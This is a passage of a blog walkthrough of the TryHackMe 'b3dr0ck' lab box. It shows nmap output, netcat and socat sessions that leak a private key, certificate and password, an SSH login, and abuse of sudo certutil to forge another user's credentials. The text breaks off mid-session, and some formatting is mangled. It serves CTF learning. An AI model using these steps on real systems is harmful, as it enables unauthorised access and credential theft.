@@ -1,0 +1,488 @@
+I"�t<p>This is an easy box from <a href="https://tryhackme.com/room/b3dr0ck">Tyhackme</a></p>
+<h2 id="enumeration">Enumeration.</h2>
+<h3 id="nmap-scan">Nmap Scan.</h3>
+<p><strong>Command</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]
+└─$ nmap -sC -sV -oN nmap-scan1 -vv 10.10.181.186
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><strong>Result</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre></td><td class="rouge-code"><pre># Nmap 7.92 scan initiated Tue Aug 30 10:33:52 2022 as: nmap -sC -sV -oN nmap-scan1 -vv 10.10.181.186
+Nmap scan report for 10.10.181.186
+Host is up, received conn-refused (0.18s latency).
+Scanned at 2022-08-30 10:33:54 EAT for 255s
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf+D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx+JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8+Ng+31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ+oPW6hcWqD2AoPVmmda82Hir+wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE+wqTZw7/JWC5H9xZqapK3wP9gVn+FGN+3JGHKuYKG6ZGc+eRel2XmIVC2PMelF4j2fY0+M8wMpXsa6MJdiyKnJwHC2V13CIvht+L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p+9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx+bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=
+|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor+e9yXT0ywIK1xKzwq7c5tZus=
+|   256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6+sHR+89
+80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://10.10.181.186:4040/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+9009/tcp open  pichat? syn-ack
+| fingerprint-strings: 
+|   NULL: 
+|     ____ _____ 
+|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
+|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
+|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ &lt;| | 
+|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
+|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
+|_    What are you looking for?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9009-TCP:V=7.92%I=7%D=8/30%Time=630DBD9E%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
+SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
+SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
+SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
+SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
+SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
+SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
+SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20&lt;\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
+SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
+SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
+SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
+SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
+SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
+SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 30 10:38:09 2022 -- 1 IP address (1 host up) scanned in 257.09 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The result shows that three ports are open which are port <code class="language-plaintext highlighter-rouge">22</code> <code class="language-plaintext highlighter-rouge">80</code>  and port <code class="language-plaintext highlighter-rouge">9009</code></p>
+<h3 id="accessing-the-web-on-browser">Accessing the web on Browser</h3>
+<p><img src="/assets/img/bedrock/port_4040.png" alt="image" /></p>
+
+<p>The above image appeared after the web redirect user to access the service on port <code class="language-plaintext highlighter-rouge">4040</code> with some message in it.</p>
+<h3 id="accessing-the-web-by-using-port-9009">Accessing the web by using port <code class="language-plaintext highlighter-rouge">9009</code></h3>
+<p>On browser this port return nothing but when intercepting it with burpsuite  it resulted to the followings:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre> __          __  _                            _                   ____   _____ 
+ \ \        / / | |                          | |            /\   |  _ \ / ____|
+  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
+   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |     
+    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
+     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
+     What are you looking for? Looks like the secure login service is running on port: 54321
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>The important part of this result is:
+1. It shows how to connect securely by using `socat`.
+2. It indicates that user can interact with results by using `netcat`.
+3. It also provide new port `54321` which is named as secure connection.
+### Access the host by using port `9009` with `netcat`.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]
+└─$ nc -v 10.10.180.92 9009                                                                                     <br />
+10.10.180.92: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.180.92] 9009 (?) open
+ __          __  _                            _                   <strong>__   __</strong>_ 
+ \ \        / / | |                          | |            /\   |  _ \ / <strong>__|
+  \ \  /\  / /</strong>| | <strong>_ ___  _ __ ___   ___  | |_ ___      /  \  | |<em>) | |   <br />
+   \ \/  \/ / _ \ |/ __/ _ | ‘</em> ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |   <br />
+    \  /\  /  __/ | (<em>| (</em>) | | | | | |  __/ | || (<em>) |  / ____ | |</em>) | |</strong>__ 
+     \/  \/ _<strong>|<em>|______/|</em>| |<em>| |</em>|_</strong>|  _<em>_<strong>/  /_/    __</strong></em>/ _<em>__</em>|</p>
+
+<p>What are you looking for?</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>User can interact by providing his needs to the host.
+#### Trying some allowed commands to make it useful.
+After some period of time i came to realize if i type `help` it return the same message as it returned in burpsuite
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>What are you looking for? help
+Looks like the secure login service is running on port: 54321</p>
+
+<p>Try connecting using:
+socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0</KEY_FILE></CERT_FILE></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>Then if you type the wrong command the output message provides to some hint on how to use it.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>What are you looking for? password
+Sorry, unrecognized request: ‘password’</p>
+
+<p>You use this service to recover your client certificate and private key</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>The above message shows that this service only serves for **client certificate(Public Key)** and his **Private key**.
+#### Retrieve Private Key.
+Trying to provide some command similar to the last message resulted to the followings:
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>What are you looking for? private key
+Sounds like you forgot your private key. Let’s find it for you…</p>
+
+<p>—–BEGIN RSA PRIVATE KEY—–
+MIIEpAIBAAKCAQEA2UR2gU8/3ZHibvunF4jlwWZQrCWjDVF+9N9tyjuMNSnIIERY
+Icdpa5mf4wa0VjZ44JPxhmOp3sVWMH/3KQcwMh5lzO4a9aO9Kcoh1Ox8ZV6NRIL3
+MZSTHuQ4aln+amBCUx/jRMA/GHZNzZG5Glhkv9ZTewzvaFm0Aw9C1CxaLjDBaiI2
+i6Q7H8yXiZlrSKsk39Bm66b7ZuDKl+QaMa0nIAaqrXHLKAnWyl8trwdOZz3dLArU
+ISqDS/w4o8+kDg6AXHOei9hffDU8vo3LjbvBWrR3jG5TEfZY6bQq7hEprBWPbi9x
+EnwMLULYishL/o4BAkVbyl/fQ8YkMhVFcy9qDQIDAQABAoIBADeSjmk21xQaa3uN
+vMiFSJc2T24o1lLixIFn4NI4dv1mKX0vXgeN1QYjrkTIgzoGBtcSoFWKinmjqg8P
+vC1vXEGFiu5m/NhVwF2/CPZIYu0eyS17/jRdV2AwacmyKSQWaQCQCHaeYcUlBXOO
+UXVOpL542LOBtH7RavzZW3OfwJVNhFUdJTmJ2zPaCy+ouCycUc4uYwLbvn4WP1ZB
+i2my8wn6nAswmVvwtuu7+1yeJ0xE5IR09YpT/ie2o0RZjgDYSl1NewxtNNIrrmEh
+yRoqx4QRy/Q9Blmtw7WBJOpSuOH79iX0mz1LNhHlkhCOxorB3croEQsBILNopIa4
+LhzRuZUCgYEA+5LJbuCzz8JjLf5xMRreE/KpAJNuC7wPzBoYBlNXq5l2UQzlUBeo
++L3Tj8XYj6ENwnj7IpI/xs/Gk8+hDRxvYCvjlV9dm7+2Yy/bp9k9AwbpdwKx2AeP
+nNDmrxrMblxuwjoOyoX5whq9lly6CkO2vWAt4fL3rlMaiw2qIT+zSPsCgYEA3Rcl
+EJCEjyK/0bOJeu0Of8a2R3Yg0RiITzmv5Bwty5iudzI/GxKrA4TbiEblt5MhsOgn
+YU0KtThn/rvTiMATWw2bpvpalVHcUdckdcarlgr1E0qKyu57mvQAAu1XxbsfANqX
+1+yD8sryiylavG4YHWVvPku+kpRRISWRga3rupcCgYA5aiW4vWWsO9QA0jopF9Wp
+Pc9eR0dtPC1qymXDQ9AVZL/A/a10GwJASqp2/JNRLFOEl7HREQmnKRJL963s3Rl6
+HGojVBF8E0Pf3TNHWmf3QeOUerP19rvK8U5Ellwjr8rDXxazF+KJbyrnnyACabPS
+AppWH+pxCZxcMfErB2u2cwKBgQDbsngecb2IDtvWIjZndNGHn4rakEQkA+DP+V8T
+qfzH6DzWLZQP7wkJQih0zx7OwOIlzUv0oH4Xfqm4tCSMK3IQdQFLeFQzNVld6hBN
+CNLREqpeNSCeb0VcwUKRphAmaL9yNcXVxy2HQqyqJLoJrM1ByN42ZUZGmiPUcGSb
+HJy2mQKBgQDpwpqvfUJDUGGZblyCn837kTn/YvasP9vgxB3FdS6+i26PeZJ3ZFqc
+Wr/KCvreZw0QGrtQ9IDzeCcwNfDrd1hXiG6nVqqA+8VZV2zEJCJQJd7ofT6CnkyH
+3VoMt8zHK6bqo9HwWFcwXJM5nmNvPBUrCCiC9PKgj9agn7ruqmWDWw==
+—–END RSA PRIVATE KEY—–</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>This file was saved as `private_key`
+#### Retrieve Public Key.
+Also trying something similar to the last message resulted to the followings:
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>What are you looking for? certificate
+Sounds like you forgot your certificate. Let’s find it for you…</p>
+
+<p>—–BEGIN CERTIFICATE—–
+MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA4MzAxMjEzMzNaFw0yMzA4MzAxMjEzMzNaMBgxFjAUBgNVBAMMDUJh
+cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDZRHaB
+Tz/dkeJu+6cXiOXBZlCsJaMNUX70323KO4w1KcggRFghx2lrmZ/jBrRWNnjgk/GG
+Y6nexVYwf/cpBzAyHmXM7hr1o70pyiHU7HxlXo1EgvcxlJMe5DhqWf5qYEJTH+NE
+wD8Ydk3NkbkaWGS/1lN7DO9oWbQDD0LULFouMMFqIjaLpDsfzJeJmWtIqyTf0Gbr
+pvtm4MqX5BoxrScgBqqtccsoCdbKXy2vB05nPd0sCtQhKoNL/Dijz6QODoBcc56L
+2F98NTy+jcuNu8FatHeMblMR9ljptCruESmsFY9uL3ESfAwtQtiKyEv+jgECRVvK
+X99DxiQyFUVzL2oNAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAE4HM7WZeArv6Ash
+Io5ahvZmVEkr6RUUe0lJuczEqglHa4JYJunmD0gRsNlfhDMR9j+nX8vsuXVUU7aE
+fWUBhO+PAs2g5YVr5mELp4ErQwZUrXfAegxXMK1qIn9WwX5VvQYO7h0W9/5oCoi1
+AIsqJuz5yYVbj8ZhHWtUYy+kCb/9QhIY4BBfzHRZXPCOOiZowSnQBfk4NV6l0slv
+IyLtUH+vWGwNTJ4VmTXVGZh2Hn7Bv3MDRfArSyqd2AEbI3nxoKraLsZ9Kc04wLFc
+uhzorcN8KLy/Vep6FzZVurHan54mmd0eNm0HdPwV6nWC/kQqWqvrtGRC7JCk2Hdr
+odaPiaU=
+—–END CERTIFICATE—–</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>This file was saved as `public_key`
+
+### Connect to Secure service.
+**Command**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]
+└─$ socat stdio ssl:10.10.180.92:54321,cert=public_key,key=private_key,verify=0</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+<p>\ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ _/ /_ <em>| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | <strong>_ | |
+   \   / _<code class="language-plaintext highlighter-rouge"> | '_ \| '_ \ / _</code> | | |  | |/ _<code class="language-plaintext highlighter-rouge"> | '_ \| '_ \ / _</code> | | |  | |/ _ | |
+    | | (_| | |_) | |_) | (_| | | |</strong>| | (</em>| | |<em>) | |</em>) | (<em>| | | |<strong>| | (_) |_|
+    |_|__,_|_.</strong>/|</em>.<strong>/ _<em>,</em>| |</strong><strong><em>/ _</em>,<em>|</em>.</strong>/|<em>.<strong>/ __,_| |</strong></em><strong>/ _</strong>/(_)</p>
+
+<p>Welcome: ‘Barney Rubble’ is authorized.
+b3dr0ck&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>Then up to this we have a valid user `Barney Rubble` . This service is also similar to the last one meaning it enables user interactions with some few commands, then lets roll again to see we will get.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>b3dr0ck&gt; help
+Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = ‘Barney Rubble’)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>This wasn't hard it was good for us. The result we have provides the password for user `Barney Rubble` which is `d1ad7c0a3805955a35eb260dab4180dd`
+## Privilege Escalation.
+### Connect to user Barney.
+Because we have username and password then we can try to login with `ssh`
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]
+└─$ ssh barney@10.10.180.92                       <br />
+barney@10.10.180.92’s password: 
+barney@b3dr0ck:~$</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>We successfully login via `ssh`.
+### Reading 1st Flag.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>THM{f05780f08f0eb1de65023069d0e4c90c}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>This machine apart from `root` and `barney` there is another user who is `fred`.
+### Check what commands and services that user `Barney` can run with `sudo`
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>barney@b3dr0ck:~$ sudo -l
+Matching Defaults entries for barney on b3dr0ck:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</p>
+
+<p>User barney may run the following commands on b3dr0ck:
+    (ALL : ALL) /usr/bin/certutil</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>User `Barney` can run `certutil` command with root privileges without root password.
+&gt;[!Question: What is certutil command ?]
+&gt;Google is my friend, so i googled it
+
+After some findings i came across this [certutil](https://akasurde.github.io/certutil-cheat-sheet.html)website guide.
+In short `certutil` is used to manage keys and certificate in both NSS databases and other NSS tokens.
+### Creating new Private Key for user Fred.
+**Command**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>barney@b3dr0ck:/usr/share/abc/certs$ sudo certutil -N -fred</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>**Result**
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>—–BEGIN RSA PRIVATE KEY—–
+MIIEpgIBAAKCAQEA0uen1Nf98aKzd5jmEdoaBjCmR5YwYIsErRciT/4QJeBzS9S6
+OMWpD3otoxLwpDHEdizl8jkKDs9Kw0Ayp1mgKwPHdaETfghYuynlefX0+B80Eo7r
++n/6sij3QLU+ym8HzLANblSKUD9tZq5iKP28rPeRJc6XtOWNPyhUF/p7nPCBkhGu
+gaxbf3ZUA/aXLznRcJ2WqBbq9+TB9GEdlCpM1b+j3NBYWbK5cx78VlBgazRHEFAY
+pSdaloAKAkC6oLy2THzuz0rW5ouWNNI96JjIuIqex8oEDklt2K7x/lL8Usq95Yhp
+gXhDb147tGz3A4xHnIgTVAIHkfMfMTBT2daIUwIDAQABAoIBAQCu4aZaKIwK/LXC
+GwfTj716moaW36PXug6zlHZATFSJg9c27vtHrickjVQgX8ko7ZeRwmMd+kwrwZml
+06rs97WHVYfkMx+dp0AkWnZNLjTmNcGRDfAA9HQlnTCA+IlLhMu739QTQ4i5SA7o
+UPtWMChuaI50Ah3rw1jfIQqyI2Ky231Dg5Q4g4KScqSx5AVchevIVHwTMrjBLBo8
+m855m8sl78F7V7fTSEyBL+eGrtgyz34j7+X6eYmxnUIHNDgj4vVUtkDSzL/tvV/D
+HTmYyAu9EC1b/qAYAQSz8GSQet6LLIFdnSR8rtPiy5P1yhAbsuGZjHVHr0uESINH
+50FbDETxAoGBAPTiFMR8F8Gb6H1RkSiO34dVrtOu8gx+O1I2e43tGqkFtqiMcxk0
+/DzJnCuV/hbOzwXgTA1UWKvdS7Uzq9UnonAks3fA41GAeUZypeenzQ02qIxf1ErF
+SUIgfUYd5So7rW7MsMzjMLTNJupReIloqKay1G188vlrUntkMTs/pxTbAoGBANx6
+sfiStVwY5y7xLbrwZv0Hw1l51v6mj7Q+P1qJQSWjrHuZNOluGO4QOnykO9m4n8vU
+Yq9YNwzGM6jI17olrG+CL1CtTpe8Ugq25ULvG3JLx50r/vTg9jMJHbMqN5qPGBY7
+cNhFroJpLhX7PJHyBnV9wzLzs9zAIlN15BLZVLfpAoGBAKZXL+4rsONlqS3/CxA2
+xKWkUSYfbvGHiXoV4iWNCpAHfoTNKp3TvQb5l+iPcVJC1qNSMbbYNYdAwd1rJOyc
+iJ2OgI326zKAh2CQHhvWgtXX6/O2YHkNu+58LTxEsFbYxL0/s1TpejtGI4oFH1CP
+VAgv71YUCuPbv+JrM3ngifkDAoGBAKmFlU2Az/1OEIMhYX341db7nxIvAkWuH5QA
+wImGOxcLr9UgyXQp+PUieTXYuUQAFq2MUYxskXc69gFy25v+14StXl/zwRgd7h7a
+3ZAHdNz+sy5/43q5ddNr0PAvJ62pFGYTsgI4IaOX551zHPFCXAD+f5Wvl73F5R6y
+6HgtrlvxAoGBAJbre5IX56kTGCikG9nMe5ze/HUg/Lkl2EFCwtg3jP1hFYb5KB/z
+cKZiqJSgFAkOuom4Jt8eZr60uYIhmRXDYJtq6iwUt+SbEW3ZjqfK771ibbblpmFo
+5FWxoOIEC6X6ygODIrlWr6oklVwRp+Vgaf1VNVKCPkN0+G1ooxjSvFar
+—–END RSA PRIVATE KEY—–</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>This part was saved as `fredkey`.
+### Creating copy the Public Key.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>—–BEGIN CERTIFICATE—–
+MIICmDCCAYACAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA4MzAxMjI4MzNaFw0yMjA4MzExMjI4MzNaMA8xDTALBgNVBAMMBGZy
+ZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDS56fU1/3xorN3mOYR
+2hoGMKZHljBgiwStFyJP/hAl4HNL1Lo4xakPei2jEvCkMcR2LOXyOQoOz0rDQDKn
+WaArA8d1oRN+CFi7KeV59fT4HzQSjuv6f/qyKPdAtT7KbwfMsA1uVIpQP21mrmIo
+/bys95Elzpe05Y0/KFQX+nuc8IGSEa6BrFt/dlQD9pcvOdFwnZaoFur35MH0YR2U
+KkzVv6Pc0FhZsrlzHvxWUGBrNEcQUBilJ1qWgAoCQLqgvLZMfO7PStbmi5Y00j3o
+mMi4ip7HygQOSW3YrvH+UvxSyr3liGmBeENvXju0bPcDjEeciBNUAgeR8x8xMFPZ
+1ohTAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAGwkjlBje+BCHQqcHGTNH9YTKQpV
+XO/mmMBgg2B9gXrbKZfhUi5kqLabkJSTIWfqqPlF/Ic9OfTm++cdnvPuyzESanX6
+EgKKwWyQ2i0uIbz1dIRKRvoQmxF3FQLH/f6PMjVxPUKtFTZFnkUSq2Unm7RZoVlE
+ho20ngYyq7rheN4/UOWUde4aGTE+/JOwXZn8ifof26sD61FwfAUsUrOa9B83jvGy
+CnlshGnJdF38GcqLMnRITbZUte06s6tJDu6m27uf/PB8rDTQyPSe4E4vy8/qJnmH
+wLVnY6eqwkYnpP6kt5HLxj0iQflsqHQKHQaLv4SU1AnY4wbd9WDoLRhoTPA=
+—–END CERTIFICATE—–</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>This was saved to file `fredpublic`.
+### Obtain credentials for user Fred.
+Connect to again to `socat` to check if we can find fred's credentials.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]
+└─$ socat stdio ssl:10.10.180.92:54321,cert=fredpublic,key=fredkey,verify=0</p>
+
+<hr />
+<p>\ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ _/ /_ <em>| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | <strong>_ | |
+   \   / _<code class="language-plaintext highlighter-rouge"> | '_ \| '_ \ / _</code> | | |  | |/ _<code class="language-plaintext highlighter-rouge"> | '_ \| '_ \ / _</code> | | |  | |/ _ | |
+    | | (_| | |_) | |_) | (_| | | |</strong>| | (</em>| | |<em>) | |</em>) | (<em>| | | |<strong>| | (_) |_|
